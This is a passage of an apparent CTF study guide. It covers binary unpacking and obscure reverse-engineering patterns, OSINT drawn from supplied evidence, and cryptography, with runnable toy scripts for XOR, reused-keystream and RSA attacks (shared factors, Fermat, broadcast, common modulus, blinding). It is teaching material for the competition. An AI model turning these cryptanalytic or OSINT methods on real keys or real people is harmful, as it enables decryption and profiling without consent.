+cp chall chall.work
+upx -t chall.work
+upx -d chall.work
+rabin2 -I chall.work
+```
+
+Failure can mean unsupported UPX, a modified header, or no UPX at all. It is not a reason to patch magic bytes blindly. For a custom packer, identify the decoding loop and inspect memory after it runs.
+
+<a id="06-reverse-engineering--13-recognize-the-less-common-patterns"></a>
+
+## 13. Recognize the less common patterns
+
+| Pattern in the source collection | Useful observation and next step |
+| --- | --- |
+| Multi-layer decryptor / RC4 gate plus VM | Solve and dump one layer at a time; feed the original verified output into the next layer |
+| S-box/SPN constants / GF(2^8) elimination | Extract tables exactly; XOR is addition in the field, and multiplication needs the observed reduction polynomial |
+| Sliding-window popcount | Adjacent count differences constrain the leaving/entering bits; enumerate only the initial window |
+| Decision-tree validator | Convert accepted leaves into constraints rather than reversing every repeated branch |
+| CVP/LLL integer validator | Preserve coefficient widths and bounds; a nearby lattice vector still needs original-checker validation |
+| Prefix key-chain VM | Each recovered block initializes the next; rollback all state when a candidate fails |
+| GBA meet-in-the-middle hash | Separate forward/backward states at a real invertible boundary and retain collision candidates |
+| Sprague-Grundy game | Recover legal moves and terminal states, then compute mex values; the winning input is game logic |
+| Kernel-module maze | Extract transitions from the module and solve the graph without loading an unknown driver |
+| ROPfuscation / return-chain obfuscation | Treat stack words as the instruction stream and track gadget side effects |
+| Image XOR / Newton convergence / PE bitmap | The program may generate an image rather than compare a string; recover dimensions, bit order, and palette |
+| Quadtree image parser | Recurse using the encoded subdivision rule; validate consumed length and leaf coordinates |
+| GLSL texture VM | Separate program memory from rendered output; handle STORE and scheduling effects explicitly |
+| Font ligatures / LED Morse / GPIO LCD | Decode the output protocol: glyph substitutions, timing units, enable edges, command/data bits |
+| BWT without a terminator | Recover rotations and use the checker's external ordering constraints to select the valid one |
+| CRT plus matrix lookup | Solve modular constraints first, then reproduce lookup/index conventions |
+| Brainfuck / FRACTRAN / Make VM / OPAL / Glulx | Identify state transitions and input-dependent comparisons before adopting a full language runtime |
+| Unusual ROM / custom opcode / KVM HLT chaining | Inspect the emulator or handler implementing the instruction, not only a generic ISA manual |
+| Cortex peripheral AES / MIPS coprocessor crypto | Memory-mapped registers or coprocessor calls may perform the cryptography outside ordinary ALU code |
+| Bootloader / real-mode x86 / ARM in pixels | Recover load base, segment/mode, and byte packing before disassembly |
+| Backdoored library / binary diff | Compare equivalent builds, strings and changed functions; startup and exported wrappers deserve attention |
+| Date-derived key / instruction counter | Preserve the exact clock or counter state used by the transform |
+| Destructor-hidden or MFC event validation | Trace object teardown or event dispatch as part of the main control flow |
+| EBCDIC SAVF / DOS stub / embedded ZIP | Identify the actual nested representation and decode it locally |
+
+AI/ML inversion examples in the source are not competition workflows here: the event's AI/ML restriction takes priority. Likewise, historical C2 enumeration and cloud-function examples do not authorize contacting unrelated services. Study their local control/data-flow lesson only.
+
+<a id="06-reverse-engineering--14-a-useful-stopping-point-and-a-reproducible-handoff"></a>
+
+## 14. A useful stopping point and a reproducible handoff
+
+Keep the original hash, exact tool/environment, relevant function addresses, transformation pseudocode, extracted constants, solver script, and original-program validation result. Describe unresolved assumptions explicitly. If a patch only displays “correct,” say so; it is not a recovered flag unless the task explicitly asks for a patch.
+
+| Failure | First correction |
+| --- | --- |
+| “Exec format error” | Match architecture/format; continue static analysis instead of installing an emulator |
+| Existing ELF reports “No such file” | Inspect its requested interpreter/loader and supplied runtime |
+| Breakpoint never hits | Verify image base, process/thread, optimization, inline comparison, and delayed library load |
+| Solver returns printable nonsense | Recheck direction, endian order, widths, and whether the expected table was a decoy |
+| Emulator hangs | Find the polling condition, missing interrupt, wrong branch semantics, or incorrect stop address |
+| A dump will not decompile | Record its runtime base and segment permissions; raw data has no loader metadata |
+| Decompiler disagrees with a run | Inspect the exact instructions, mutated code, ABI and hidden handlers |
+
+Source map: `ctf-reverse/SKILL.md`, `tools.md`, `radare2-r2pipe.md`, `tools-dynamic.md`, `tools-emulation.md`, `tools-advanced.md`, `tools-advanced-2.md`, `mba-simplification.md`, `anti-analysis.md`, `anti-analysis-ctf.md`, `patterns.md`, `patterns-runtime.md`, `patterns-ctf.md`, `patterns-ctf-2.md`, `patterns-ctf-3.md`, `languages.md`, `languages-platforms.md`, `languages-compiled.md`, `platforms.md`, `platforms-hardware.md`, `unicorn-emulation.md`, and `field-notes.md`. Paths after the first share the `ctf-reverse/` prefix. The source `ctf-reverse/tools-mcp.md` is retained as provenance only; its agent integration and unapproved-tool setup are excluded from the human workflow.
+
+
+---
+
+<a id="10-osint"></a>
+
+<a id="10-osint--osint-from-supplied-evidence"></a>
+
+# OSINT from supplied evidence
+
+**Quick route:** [Short commands](#quickstart--osint) · [Tool strengths and weaknesses](#tool-chooser--osint). Use this chapter for deeper explanations.
+
+Build an evidence trail from a clue to an answer. Preserve exact identifiers, original text, dates, and uncertainty. A matching username, reused photograph, or hosting IP is a lead; it does not independently establish identity or location.
+
+Manual Google searches, technical references and Google Translate are explicitly allowed by PDF p.6. Work from supplied clues and corroborate public evidence. Do not upload challenge images to reverse-image services, use face recognition or ask outsiders/bots for assistance. [Reference and communication rules](#competition--what-is-allowed).
+
+<a id="10-osint--environment-and-local-inventory"></a>
+
+## Environment and local inventory
+
+**Windows native:** Chrome and a PDF viewer, Windows workbook rows 12 and 10. **WSL:** Python 3, ExifTool, pdftotext, strings (Windows rows 14, 21, 22, 18). **Kali:** Git, ripgrep, ImageMagick, SQLite, MediaInfo (Kali rows 56, 126, 74, 138, 94). Keep those environments distinct; a Kali tool is not automatically installed in WSL.
+
+Use a notebook or CSV with these columns:
+
+```text
+clue_id,source_file,source_offset_or_page,observation,hypothesis,confidence,next_check
+```
+
+Example observation: “profile-export.json contains account ID 123 and display name Harbor.” Hypothesis: “Harbor is the account's current alias.” The number is more stable than a display name, but exported metadata can still be fabricated.
+
+**Kali**, search a supplied evidence directory without contacting its links:
+
+```bash
+rg -n -i 'username|handle|author|identifier|location|latitude|longitude' evidence
+rg -n -i 'https?://|mailto:|t\.me/|github\.com/' evidence
+```
+
+**WSL**, inspect media metadata and PDF text:
+
+```bash
+exiftool -a -u -g1 evidence/photo.jpg
+exiftool -GPSLatitude -GPSLongitude -GPSLatitudeRef -GPSLongitudeRef -n evidence/photo.jpg
+pdftotext -layout evidence/document.pdf document.txt
+strings -a -n 6 evidence/blob.bin > blob-strings.txt
+```
+
+Expected result: concrete coordinates, timestamps, embedded names, document titles, or linked identifiers. Metadata can be edited or stripped; absence is not proof of deception. Do not assume every social platform always removes every metadata field.
+
+<a id="10-osint--parse-saved-pages-and-json"></a>
+
+## Parse saved pages and JSON
+
+Saved HTML may include richer JSON-LD or application state than the visible page. In Chrome, open a **copy** only if its active-content behavior is understood; otherwise read as text. Search for `application/ld+json`, `author`, `identifier`, `content`, and media URLs. Keep archived fetch date separate from the page's claimed publication date.
+
+This **WSL standard-library** script extracts link targets and script blocks from a local saved page. It does not fetch them. Save as `page_extract.py`:
+
+```python
+from html.parser import HTMLParser
+from pathlib import Path
+
+class Page(HTMLParser):
+    def __init__(self):
+        super().__init__(); self.links=[]; self.blocks=[]; self.current=None
+    def handle_starttag(self, tag, attrs):
+        attrs=dict(attrs)
+        for key in ('href','src'):
+            if key in attrs: self.links.append((tag,key,attrs[key]))
+        if tag=='script': self.current=[attrs.get('type',''),[]]
+    def handle_data(self,data):
+        if self.current is not None: self.current[1].append(data)
+    def handle_endtag(self,tag):
+        if tag=='script' and self.current is not None:
+            self.blocks.append(self.current); self.current=None
+
+p=Page(); p.feed(Path('page.html').read_text(encoding='utf-8',errors='replace'))
+for item in p.links: print(item)
+out=Path('page-scripts'); out.mkdir(exist_ok=True)
+for i,(kind,chunks) in enumerate(p.blocks):
+    (out/f'{i:03d}.txt').write_text(''.join(chunks),encoding='utf-8')
+    print(i,kind)
+```
+
+Read extracted JSON with `python3 -m json.tool page-scripts/000.txt` when that block is actual JSON. JavaScript assignments are not JSON; extract the value deliberately rather than executing the block. An HTTP 200 status can be a login wall or generic “not found” page; compare body content and stable identifiers.
+
+<a id="10-osint--aliases-social-exports-and-timestamps"></a>
+
+## Aliases, social exports, and timestamps
+
+In supplied profile exports, correlate numeric IDs, explicit cross-links, avatar history, post IDs, and dates. Same handles on different platforms are not identity proof. Numeric suffixes could be postal codes, years, random numbers, or deliberate misdirection; test alternatives against independent evidence.
+
+For a Twitter-style Snowflake **known to use that scheme**, decode its creation timestamp locally:
+
+```python
+from datetime import datetime,timezone
+snowflake=1234567890123456789  # replace with the observed numeric ID
+milliseconds=(snowflake>>22)+1288834974657
+print(datetime.fromtimestamp(milliseconds/1000,timezone.utc).isoformat())
+```
+
+Discord uses a different epoch; other services use entirely different ID schemes. A calculated timestamp does not prove an account belongs to a person. Retain the original identifier alongside the derived time.
+
+For saved social-media datasets, inspect all supplied posts/replies, bios, playlist descriptions, role names, emoji frames, and image variants. Short-duration GIF frames can hide text; use the steganography chapter's animation workflow. Preserve playlist/album order when testing acrostics. For gaming data, include realm/server and character IDs; a character name without server context is ambiguous.
+
+A supplied fitness route can identify a **challenge location** from its path and landmarks. Do not infer or expose a real person's home from privacy-zone boundaries. Use the exact endpoint/waypoint requested by the challenge, and distinguish a route from the camera position.
+
+<a id="10-osint--unicode-and-encoded-clues"></a>
+
+## Unicode and encoded clues
+
+Before normalizing text, list its codepoints. Homoglyph encodings often mix Latin and Cyrillic lookalikes, but emoji, accents, and smart punctuation are not automatically secret bits. **WSL:**
+
+```python
+from pathlib import Path
+import unicodedata
+text=Path('post.txt').read_text(encoding='utf-8')
+for i,c in enumerate(text):
+    print(i,repr(c),f'U+{ord(c):04X}',unicodedata.name(c,'CONTROL'))
+pairs={'a':'\u0430','e':'\u0435','o':'\u043e','p':'\u0440','c':'\u0441','x':'\u0445'}
+zeros=set(pairs); ones=set(pairs.values())
+bits=''.join('0' if c in zeros else '1' for c in text if c in zeros|ones)
+for shift in range(8):
+    b=bits[shift:]
+    data=bytes(int(b[i:i+8],2) for i in range(0,len(b)-7,8))
+    print(shift,repr(data))
+```
+
+The explicit alphabet is a hypothesis; change it only with evidence. Whole-text ASCII/non-ASCII encoding is a different scheme and includes spaces/punctuation differently. Record the choice so someone else can reproduce it.
+
+For a Base58 clue, preserve leading `1` characters as leading zero bytes:
+
+```python
+from pathlib import Path
+alphabet='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
+s=Path('base58.txt').read_text().strip()
+number=0
+for ch in s: number=number*58+alphabet.index(ch)
+zeroes=len(s)-len(s.lstrip('1'))
+decoded=b'\0'*zeroes+number.to_bytes((number.bit_length()+7)//8,'big')
+print(repr(decoded))
+```
+
+Validate a Base58Check checksum when the format requires one. Strings of 32/40/64 hexadecimal characters can be MD5/SHA-1/SHA-256, but may also be random IDs, Tor fingerprints, keys, or data. Length is a classification clue, not a definitive algorithm detector.
+
+<a id="10-osint--geolocation-without-image-uploads"></a>
+
+## Geolocation without image uploads
+
+Make an observation sheet before choosing a country: readable sign fragments, writing systems, road numbers, driving side, rail crossings, building layout, terrain, coastline, shadows, and unique small objects. Generic architecture and vegetation should carry low confidence. A Cyrillic sign does not uniquely identify Russia, and motorway sign colors vary by road class; the source's one-feature country table was too strong.
+
+**Kali ImageMagick**, row 74, makes local inspection copies:
+
+```bash
+magick photo.jpg -crop 600x300+120+80 +repage -resize 200% sign.png
+magick sign.png -flop mirrored-sign.png
+magick sign.png -colorspace Gray -auto-level contrast-sign.png
+```
+
+The crop is `width×height+x+y`; measure it on the image. `-flop` mirrors horizontally. Use nearest-neighbor scaling for pixel grids; ordinary photo inspection can use other interpolation. Preserve the original and record transformations. Do not invent illegible letters; keep alternate readings in the notes.
+
+Compare candidate photographs/maps already supplied by the organizer. Verify at least two independent scene constraints: building alignment plus road geometry, or sign plus coastline. For exact viewpoint tasks, match camera position using foreground poles, paths, bollards, and the relative alignment of distant buildings. The subject's coordinate can differ substantially from the camera's.
+
+For newspaper or product clues, use supplied catalogs/archives: record publication date, page number, headline, model number, voltage/capacity, and dimensions. A matching brand without the exact model is insufficient. For a series of music landmarks, solve locations first, then assemble the per-image key numbers in the specified order; do not adjust uncertain locations merely to force readable ASCII.
+
+<a id="10-osint--coordinates-and-local-spatial-checks"></a>
+
+## Coordinates and local spatial checks
+
+Latitude/longitude order and hemisphere signs are frequent errors. Decimal degrees are not degrees-minutes-seconds. An MGRS string includes zone, latitude band, grid square, and equally precise easting/northing digits; do not treat it as a decimal coordinate. A short Plus Code needs a reference locality; a full Open Location Code does not. What3Words is a distinct system and cannot be converted using a guessed word grid.
+
+For non-AI Python libraries, PDF p.5 permits additions in either environment subject to named exclusions; use a documented coordinate conversion library only after checking its input/output convention. Do not assume public conversion websites are an approved analysis route. If the required proprietary lookup is unavailable, preserve the verified coordinates and state the conversion dependency.
+
+For a supplied `places.csv` with `name,lat,lon`, this **WSL** script ranks locations near a clue coordinate using a spherical distance:
+
+```python
+import csv,math
+latitude,longitude=13.7563,100.5018  # replace with clue coordinates
+def distance(lat,lon):
+    a,b=map(math.radians,(latitude,lat))
+    dlat=b-a; dlon=math.radians(lon-longitude)
+    h=math.sin(dlat/2)**2+math.cos(a)*math.cos(b)*math.sin(dlon/2)**2
+    return 6371000*2*math.asin(min(1,math.sqrt(h)))
+rows=[]
+with open('places.csv',newline='',encoding='utf-8') as f:
+    for row in csv.DictReader(f):
+        rows.append((distance(float(row['lat']),float(row['lon'])),row['name']))
+for metres,name in sorted(rows)[:20]: print(round(metres,1),name)
+```
+
+Expected result: a candidate list, not a final match. Ten metres may be smaller than the map's coordinate error. For a supplied OSM JSON export, filter `elements[].tags` for `shop`, `amenity`, `railway`, and `tourism`, then compare proximity locally. Ways may need geometry/centroids; a node-only export can omit the desired business entirely.
+
+<a id="10-osint--dns-registration-archives-and-infrastructure"></a>
+
+## DNS, registration, archives, and infrastructure
+
+Start with supplied DNS captures, zone files, WHOIS/RDAP exports, certificate records, or archive indexes. Extract TXT/CNAME/MX records and preserve answer timestamps/TTL. TXT records can consist of multiple strings within one record: join those in order, but do not merge independent answers arbitrarily.
+
+A stored archive index can reveal old URLs and date ranges; an archived snapshot's timestamp is the crawl time, not the original publication time. Compare saved old/new pages for changed aliases and links. For saved Google Docs/Sheets exports, preserve document IDs and sheet IDs; a private-access response is not a puzzle to bypass.
+
+Registrars, shared name servers, shared IPs, and ASNs are infrastructure correlations, not ownership proof. IP geolocation may point to a provider, VPN, or coarse regional estimate. A reused SSH host key or certificate can indicate a reused image/configuration rather than one physical server. Tor relay fingerprint/family data in a supplied export can support chronology, but does not identify a user.
+
+Active DNS queries, zone transfers, service fingerprinting, and scanning belong only to a challenge-designated target and the permitted tools for that machine. This offline chapter does not turn a public hostname found in evidence into an attack target. Do not copy the historical cross-challenge infrastructure-pivot advice into event practice.
+
+<a id="10-osint--repository-and-file-metadata-pivots"></a>
+
+## Repository and file-metadata pivots
+
+**Kali Git**, row 56, on a supplied local repository:
+
+```bash
+git -C repo log --all --format='%H %aI %an <%ae> %cn <%ce>'
+git -C repo log --all --diff-filter=D --name-status
+git -C repo log --all -p -- '*.private' '*.key' '*.txt'
+git -C repo show COMMIT:path/to/file
+```
+
+Replace `COMMIT` with an observed ID. Examine `.mailmap`, README links, contributors, commit messages, and supplied issue/review exports. Author/committer fields are user-controlled; most Git history is not cryptographically signed. Even a valid signature needs a trusted key-to-identity link.
+
+For a supplied `.DS_Store`, inspect filenames with a permitted local non-AI parser in WSL; Finder metadata indicates names seen in a directory, not contents or necessarily current files. Do not recursively fetch discovered paths from unrelated sites. For TTF remapping clues, a non-AI `fontTools` script can inspect cmap and glyph contours locally; contour matching works best against the exact reference font and normalization, not any arbitrary standard font.
+
+<a id="10-osint--finish-the-chain"></a>
+
+## Finish the chain
+
+For each answer component, record the source, exact observation, transformation, and independent confirmation. Keep rejected hypotheses too when they explain ambiguity. A final location should state whether it is a building, camera point, route waypoint, or coordinate grid cell, with the requested precision.
+
+Source material adapted: all five files in `ctf-osint/`. Agent automation, paid/API-key services, public image uploads, face recognition, credentialed Discord enumeration, live bot interaction, invasive location inference, and cross-challenge pivots were excluded. Their underlying local evidence-reading methods are retained where useful.
+
+
+---
+
+<a id="07-cryptography"></a>
+
+<a id="07-cryptography--cryptography-recover-the-structure-before-the-secret"></a>
+
+# Cryptography: recover the structure before the secret
+
+**Quick route:** [Short commands](#quickstart--rsa) · [Tool strengths and weaknesses](#tool-chooser--cryptography). Use this chapter for deeper explanations.
+
+A crypto challenge usually supplies an algorithm, parameters, ciphertext, or a query service. Your first task is to translate those into an exact mathematical statement. A recognizable number size or file extension is a clue; it is not an attack.
+
+This chapter gives runnable local examples for common cases. [Advanced cryptography](#14-advanced-crypto) preserves the repository's lattice, elliptic-curve, polynomial, proof-system, post-quantum, and unusual algebra topics with diagnostics and constraints.
+
+<a id="07-cryptography--1-environment-and-notation"></a>
+
+## 1. Environment and notation
+
+**Windows:** open WSL and use the listed Python 3, OpenSSL, and RsaCtfTool installations. Native Windows Python is not assumed. **Kali:** Python is used throughout; the sheet lists crypto-attacks at `/opt/tools/crypto-attacks`, hlextend, hashcat, John, and other tools. Check the actual interpreter and tool before relying on them.
+
+SageMath is approved on Kali, but its installation details are blank. Try `sage --version`; use the standard-library routes for basic arithmetic if absent. PDF p.5 permits non-AI dependencies in both environments; [package setup](#00-tool-rules--non-ai-python-package-checks) explains the limits. Named rejected tools and online services remain excluded.
+
+Factordb-python is listed on Kali. That is not authorization to send challenge moduli to the FactorDB website. Keep factoring local. Do not use online hash-cracking, online mathematical solvers, AI tools, or public challenge uploads.
+
+```bash
+python3 --version
+python3 -c "import sys; print(sys.executable); print(pow(3, -1, 11))"
+```
+
+Expected inverse: `4`, because `3*4 % 11 == 1`. Modular inverses require coprime inputs; an exception is meaningful evidence, not a reason to switch to floating point.
+
+| Symbol | Meaning | Common error |
+|---|---|---|
+| `n` | RSA modulus or a group order, depending on context | Confusing the field prime with the subgroup order |
+| `p`, `q` | Usually primes | Assuming repeated or composite factors are impossible |
+| `e`, `d` | Public and private exponents | Inverting modulo `n` instead of the appropriate group exponent |
+| `m`, `c` | Integer message and ciphertext | Losing leading zero bytes |
+| `k` | Nonce, key, or multiplier | Reusing a variable for unrelated quantities |
+| `^` | XOR in Python; exponentiation in Sage preparsed files | Copying syntax between interpreters |
+
+Every Python block with a filename below is a complete local demonstration. Save it and run `python3 filename.py`. Replace toy values only after the assertions pass.
+
+<a id="07-cryptography--2-triage-worksheet"></a>
+
+## 2. Triage worksheet
+
+Record these before choosing an attack:
+
+```text
+Artifact: source / text / binary / capture / query service
+Encoding: hex / base64 / decimal integers / raw bytes
+Known values: ______________________________
+Unknown values: ____________________________
+Equation or state update: __________________
+Oracle input and exact response: ___________
+Query limit / reset behavior: ______________
+Verification equation: _____________________
+```
+
+Read source in execution order. Trace key generation, serialization, padding, nonce generation, encryption/signing, and verification. Check whether two apparently separate operations share a secret or RNG state. A cryptographically strong primitive can be surrounded by a weak protocol.
+
+| Observation | First local check | Next branch |
+|---|---|---|
+| Small `e`, short unpadded message | Exact integer root | RSA low-exponent section |
+| Several RSA moduli | Pairwise GCD | Shared factors |
+| Several encryptions of the same message | Compare modulus/exponent relationships | Common modulus or broadcast |
+| Repeated nonce or IV | Compare ciphertext XOR and tags | Stream or authenticated-encryption analysis |
+| Equal 16-byte ciphertext blocks | Count block repetitions | ECB hypothesis |
+| Distinct decryption errors | Repeat controlled malformed samples | Padding/error oracle |
+| Repeated signature `r` | Compare messages and signatures | Nonce reuse |
+| Numeric outputs from a PRNG | Check exact bit widths and output transformation | LCG, MT, LFSR, or constraint model |
+| Approximate linear equations modulo `q` | Estimate error bound | Lattice chapter |
+
+<a id="07-cryptography--3-bytes-integers-and-encodings"></a>
+
+## 3. Bytes, integers, and encodings
+
+Save as `bytes_basics.py`:
+
+```python
+import base64
+
+original = b'\x00CTF{toy}'
+value = int.from_bytes(original, 'big')
+recovered = value.to_bytes(len(original), 'big')
+assert recovered == original
+assert bytes.fromhex(original.hex()) == original
+assert base64.b64decode(base64.b64encode(original), validate=True) == original
+print(original.hex())
+print(value)
+print(recovered)
+```
+
+Expected final line: `b'\x00CTF{toy}'`. If you choose output length solely from `bit_length`, the initial zero disappears. For RSA, use the modulus byte length when inspecting padded plaintext; trim only after recognizing the padding format.
+
+Hex and base64 are encodings, not encryption. Decode one layer into a new file and inspect its header and length. Arbitrarily repeating decoders can turn random data into misleading printable fragments.
+
+<a id="07-cryptography--4-classical-ciphers-and-xor"></a>
+
+## 4. Classical ciphers and XOR
+
+For substitution and transposition, preserve punctuation, spacing, alphabet, and repeated groups. Compare character frequencies and repeated distances. A long alphabetic text supports frequency analysis; a short random flag often does not.
+
+For Vigenère, test plausible key lengths using repeated distances and coincidence statistics, then analyze each residue class separately. For book ciphers, establish the exact edition, tokenization, indexing base, and whether punctuation counts. For Polybius/Nihilist/pigpen/semaphore, identify the symbol alphabet before forcing ASCII.
+
+Save as `xor_known_plaintext.py`:
+
+```python
+def xor(a, b):
+    if len(a) != len(b):
+        raise ValueError('equal lengths required')
+    return bytes(x ^ y for x, y in zip(a, b))
+
+key = b'ICE'
+plain = b'CTF{repeat_xor_is_not_a_pad}'
+cipher = bytes(c ^ key[i % len(key)] for i, c in enumerate(plain))
+known = b'CTF'
+recovered_key = xor(cipher[:len(known)], known)
+recovered = bytes(c ^ recovered_key[i % len(recovered_key)]
+                  for i, c in enumerate(cipher))
+assert recovered_key == key
+assert recovered == plain
+print(recovered.decode())
+```
+
+This works because the known plaintext covers the entire repeating key at the correct alignment. If the key is longer, those bytes reveal only part of it. Validate a candidate key against file structure, checksum, or several independent known bytes, not just a guessed flag prefix.
+
+For single-byte XOR, all 256 candidates are cheap locally. Score printable text and expected structure; do not select the first candidate containing a brace. For repeating XOR, compare several key lengths and penalize overly long keys that merely fit a guessed prefix.
+
+<a id="07-cryptography--reused-one-time-pad-or-stream-nonce"></a>
+
+### Reused one-time pad or stream nonce
+
+For equal-length streams, `c1 XOR c2 = p1 XOR p2`. It removes the reused keystream, not both plaintexts at once.
+
+Save as `reused_stream.py`:
+
+```python
+from hashlib import sha256
+
+def xor(a, b):
+    assert len(a) == len(b)
+    return bytes(x ^ y for x, y in zip(a, b))
+
+p1 = b'known message 01'
+p2 = b'secret message!!'
+assert len(p1) == len(p2)
+stream = sha256(b'toy reused stream').digest()[:len(p1)]
+c1, c2 = xor(p1, stream), xor(p2, stream)
+recovered = xor(xor(c1, c2), p1)
+assert recovered == p2
+print(recovered)
+```
+
+If output is nonsense, check offsets, encoding, compression, and whether nonce reuse actually produced the same key stream. Load-balanced servers may use different keys or counters; group samples by backend evidence before comparing them.
+
+<a id="07-cryptography--5-reusable-exact-arithmetic"></a>
+
+## 5. Reusable exact arithmetic
+
+Save this as `math_helpers.py`. Later examples import it from the same directory.
+
+```python
+from math import gcd, prod
+
+def iroot(value, degree):
+    """Return floor(value**(1/degree)) using integer arithmetic."""
+    if value < 0 or degree < 1:
+        raise ValueError('nonnegative value and positive degree required')
+    lo, hi = 0, 1
+    while hi ** degree <= value:
+        hi *= 2
+    while lo + 1 < hi:
+        mid = (lo + hi) // 2
+        if mid ** degree <= value:
+            lo = mid
+        else:
+            hi = mid
+    return lo
+
+def egcd(a, b):
+    old_r, r = a, b
+    old_s, s = 1, 0
+    old_t, t = 0, 1
+    while r:
+        q = old_r // r
+        old_r, r = r, old_r - q*r
+        old_s, s = s, old_s - q*s
+        old_t, t = t, old_t - q*t
+    return old_r, old_s, old_t
+
+def crt(residues, moduli):
+    if len(residues) != len(moduli) or not moduli:
+        raise ValueError('one residue per modulus required')
+    for i, a in enumerate(moduli):
+        if a <= 1 or any(gcd(a, b) != 1 for b in moduli[:i]):
+            raise ValueError('pairwise coprime moduli greater than one required')
+    total = prod(moduli)
+    result = 0
+    for residue, modulus in zip(residues, moduli):
+        partial = total // modulus
+        result += residue * partial * pow(partial, -1, modulus)
+    return result % total
+
+if __name__ == '__main__':
+    assert iroot(27, 3) == 3 and iroot(28, 3) == 3
+    assert iroot(0, 3) == 0
+    assert crt([2, 3, 2], [3, 5, 7]) == 23
+    g, a, b = egcd(17, 13)
+    assert g == 1 and 17*a + 13*b == 1
+    print('exact arithmetic checks passed')
+```
+
+Run `python3 math_helpers.py`. Never use `int(c ** (1/3))` on large RSA integers: floating-point precision makes it unreliable.
+
+<a id="07-cryptography--6-rsa-with-known-factors"></a>
+
+## 6. RSA with known factors
+
+Save as `rsa_known_factors.py`:
+
+```python
+from math import gcd, lcm
+
+p, q, e = 61, 53, 17
+n = p*q
+lam = lcm(p-1, q-1)
+assert gcd(e, lam) == 1
+d = pow(e, -1, lam)
+m = 65
+c = pow(m, e, n)
+recovered = pow(c, d, n)
+assert p*q == n
+assert recovered == m
+assert pow(recovered, e, n) == c
+print(n, c, recovered)
+```
+
+Expected output: `3233 2790 65`. Re-encryption is the essential verification. For multiple distinct primes, use the LCM of each `p_i-1`. For repeated prime powers, use the correct totient/group structure; `(p-1)*(q-1)` is wrong when `p == q`.
+
+If `gcd(e, lambda(n)) != 1`, there is no unique private exponent of this form. Factor the modulus and recover all appropriate roots; select using format and re-encryption. See the advanced chapter rather than silently choosing an invalid inverse.
+
+<a id="07-cryptography--shared-factors-and-close-primes"></a>
+
+### Shared factors and close primes
+
+Save as `rsa_factor_checks.py`:
+
+```python
+from math import gcd, isqrt
+
+moduli = [101*113, 101*127, 131*137]
+hits = []
+for i, n in enumerate(moduli):
+    for j in range(i):
+        p = gcd(n, moduli[j])
+        if 1 < p < n:
+            hits.append((j, i, p))
+assert hits == [(0, 1, 101)]
+print('shared:', hits)
+
+def fermat(n, budget=10000):
+    if n % 2 == 0:
+        return 2, n//2
+    a = isqrt(n)
+    if a*a < n:
+        a += 1
+    for _ in range(budget):
+        delta = a*a - n
+        b = isqrt(delta)
+        if b*b == delta:
+            return a-b, a+b
+        a += 1
+    return None
+
+factors = fermat(1009*1013)
+assert factors == (1009, 1013)
+print('close primes:', factors)
+```
+
+For many keys, pairwise GCD is quadratic; use a local batch-GCD implementation from approved crypto-attacks after validating its inputs. Duplicate moduli produce `gcd == n`, which is not a new factor. Fermat is useful when primes are close; an exhausted budget is a reason to pivot.
+
+<a id="07-cryptography--small-exponent-common-modulus-broadcast"></a>
+
+### Small exponent, common modulus, broadcast
+
+Save as `rsa_structural.py`, beside `math_helpers.py`:
+
+```python
+from math_helpers import iroot, egcd, crt
+
+# Case 1: no modular wraparound.
+m, e, n = 42, 3, 1000003*1000033
+c = pow(m, e, n)
+root = iroot(c, e)
+assert root**e == c and root == m
+print('small exponent:', root)
+
+# Case 2: same message and modulus, coprime exponents.
+n, e1, e2, m = 101*113, 3, 7, 42
+c1, c2 = pow(m, e1, n), pow(m, e2, n)
+g, a, b = egcd(e1, e2)
+assert g == 1
+recovered = pow(c1, a, n) * pow(c2, b, n) % n
+assert recovered == m
+assert pow(recovered, e1, n) == c1
+print('common modulus:', recovered)
+
+# Case 3: same unpadded message under three coprime moduli.
+moduli = [101*113, 107*131, 137*149]
+m, e = 42, 3
+cs = [pow(m, e, modulus) for modulus in moduli]
+combined = crt(cs, moduli)
+recovered = iroot(combined, e)
+assert recovered**e == combined and recovered == m
+assert all(pow(recovered, e, modulus) == ci
+           for modulus, ci in zip(moduli, cs))
+print('broadcast:', recovered)
+```
+
+Small `e` alone is insufficient: padding or modular wraparound defeats the first check. The common-modulus script needs invertible ciphertexts for negative exponents; a failed inverse may expose a factor through GCD. Broadcast needs the same integer message and enough combined modulus size. Randomized padding breaks that assumption.
+
+<a id="07-cryptography--textbook-rsa-multiplicativity"></a>
+
+### Textbook RSA multiplicativity
+
+Save as `rsa_blinding_toy.py`:
+
+```python
+from math import gcd
+
+p, q, e = 61, 53, 17
+n = p*q
+d = pow(e, -1, (p-1)*(q-1))
+message = 65
+ciphertext = pow(message, e, n)
+factor = 2
+assert gcd(factor, n) == 1
+modified = ciphertext * pow(factor, e, n) % n
+
+def toy_decrypt_oracle(c):
+    return pow(c, d, n)
+
+answer = toy_decrypt_oracle(modified)
+recovered = answer * pow(factor, -1, n) % n
+assert recovered == message
+print(recovered)
+```
+
+This models an oracle that refuses one ciphertext but decrypts related ciphertexts. Proper padding and protocol validation change the available oracle. Never assume a signing oracle accepts arbitrary integers; inspect hashing and encoding first.
+
+<a id="07-cryptography--rsactftool-without-accidental-online-analysis"></a>
+
+### RsaCtfTool without accidental online analysis
+
+On **Windows WSL**, locate the supplied RsaCtfTool entry point and read its local help. Inspect a PEM public key with the listed OpenSSL:
+
+```bash
+openssl pkey -pubin -in public.pem -text -noout
+```
+
+Expected fields include the modulus and exponent. Choose a local attack matching an observed property, such as close primes or shared factors. Do not launch an all-attacks mode without checking whether it includes network-backed factoring. If the entry point is absent, extract the numbers from supplied text and use the scripts above.
+
+<a id="07-cryptography--7-block-modes-distinguish-confidentiality-from-integrity"></a>
+
+## 7. Block modes: distinguish confidentiality from integrity
+
+For AES the block size is 16 bytes. ECB encrypts equal plaintext blocks to equal ciphertext blocks under the same key. CBC combines each plaintext block with the previous ciphertext block (or IV). CTR and OFB generate a stream that is XORed with plaintext.
+
+Save as `block_repetitions.py` and pass a raw ciphertext filename:
+
+```python
+from collections import Counter
+from pathlib import Path
+import sys
+
+data = Path(sys.argv[1]).read_bytes()
+for offset in range(16):
+    blocks = [data[i:i+16] for i in range(offset, len(data)-15, 16)]
+    repeats = sum(count-1 for count in Counter(blocks).values() if count > 1)
+    if repeats:
+        print('offset', offset, 'repeated blocks', repeats)
+```
+
+Repeated blocks are evidence of deterministic block behavior, not a complete ECB proof. File headers, duplicated chunks, and framing can create repetitions too. With a chosen-plaintext oracle, compare ciphertext for repeated aligned input blocks.
+
